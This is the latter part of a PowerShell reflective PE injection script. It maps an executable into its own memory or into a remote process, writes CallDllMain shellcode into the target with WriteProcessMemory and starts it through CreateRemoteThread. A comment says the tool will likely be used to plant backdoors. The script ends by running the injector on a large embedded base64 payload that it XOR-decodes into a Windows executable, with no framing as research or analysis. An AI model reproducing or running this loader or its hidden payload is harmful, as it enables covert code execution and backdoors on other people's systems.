		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = 	Get-Win32Functions
		$Win32Types = 		Get-Win32Types
		$Win32Constants =  	Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		
		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes  -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
				
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
				Write-Verbose "Calling function with WString return type"
				[IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName $Func
				if ($WStringFuncAddr -eq [IntPtr]::Zero)
				{
					Throw "Couldn't find function address."
				}
				$WStringFuncDelegate = Get-DelegateType @() ([Int32])
				$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				[IntPtr]$OutputPtr = $WStringFunc.Invoke()
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#if ($PsCmdlet.ParameterSetName -ieq "LocalFile")
	#{
    [Byte[]]$PEBytes = [System.Convert]::FromBase64String($PEBytes)
	
	for ($i = 0; $i -lt $PEBytes.Count; $i++)
	{
		$PEBytes[$i]=$PEBytes[$i] -bXOR 0x17
	}
	#[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
	#}
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    $PEBytes[0] = 0
    $PEBytes[1] = 0

	Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $Func, $ProcId,$ForceASLR)
}

Main

}
Invoke-ReflectivePEInjection -PEBytes "Wk2HFxQXFxcTFxcX6OgXF68XFxcXFxcXVxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXNxYXFxkIrRkXox7aNq8WW9o2Q39+ZDdnZXhwZXZ6N3R2eXl4Yzd1cjdlYnk3fnk3U1hEN3p4c3I5GhodMxcXFxcXFxd99pPqOZf9uTmX/bk5l/25SvX5uDOX/blK9f64PJf9uUr1+LhGl/25VuFXuT+X/blW4WO5OJf9uac3Ork4l/254PX+uDCX/bng9fi4J5f9ueD1+bgrl/25SvX8uCqX/bk5l/y5lJf9ufL09Lgtl/258vT9uDiX/bny9P+4OJf9uUV+dH85l/25FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXR1IXF3OREhcqAQ9NFxcXFxcXFxfnFzU3HBUZHBfVFhcXOxYXFxcXFzvUFxcXBxcXFxcXlxYXFxcXBxcXFxUXFxEXFxcXFxcXERcXFxcXFxcXJxQXFxMXFxcXFxcVF3cWFxcHFxcXFxcXBxcXFxcXFxcXBxcXFxcXFwcXFxcXFxcXFxcXBxcXF9ekFRcrFhcX66MVF98XFxcXFxcXFxcXFxcXFBeHDxcXFxcXFxcXFxcXNxQXrxEXFzeDFRcLFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXV4MVF+8XFxcXFxcXFxcXFxf3Fhc3EhcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXOWNyb2MXFxeJ1xYXFwcXFxfVFhcXExcXFxcXFxcXFxcXFxcXNxcXdzllc3ZjdhcXlfIXFxf3FhcX8RcXF9EWFxcXFxcXFxcXFxcXF1cXF1c5c3ZjdhcXF2M1FxcXxxUXFwcXFxe7FRcXFxcXFxcXFxcXFxdXFxfXOWdzdmN2FxeHDxcXFxcUFxcNFxcXqxUXFxcXFxcXFxcXFxcXVxcXVzllcnt4dBcXrxEXFxc3FBcXHxcXF8EVFxcXFxcXFxcXFxcXF1cXF1UXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX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